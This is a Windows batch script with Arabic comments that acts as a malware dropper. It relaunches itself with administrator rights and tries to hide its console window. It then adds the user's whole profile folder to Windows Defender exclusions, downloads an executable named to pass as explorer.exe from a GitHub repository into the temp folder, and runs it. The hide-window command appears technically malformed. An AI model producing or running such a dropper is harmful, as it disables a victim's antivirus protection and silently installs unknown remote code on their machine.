@echo off

:: تحقق من صلاحيات المدير
net session >nul 2>&1
if %errorLevel% NEQ 0 (
    echo طلب صلاحيات المدير...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~f0' -Verb RunAs"
    exit
)

:: إخفاء نافذة الكونسول
powershell -Command "$console = Get-Process -Id $PID; $console.MainWindowHandle | ForEach-Object { [void][DllImport('user32.dll')]::ShowWindow($_, 0) }"

:: إضافة مسار الاستثناء إلى Windows Defender
powershell -Command "Add-MpPreference -ExclusionPath $env:USERPROFILE"

:: تحميل الملف
set url=https://github.com/Aevagee/younet/raw/refs/heads/main/explorer.exe
set outputFile=%temp%\explorer.exe
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%outputFile%'"

:: تشغيل الملف الذي تم تنزيله
start "" "%outputFile%"
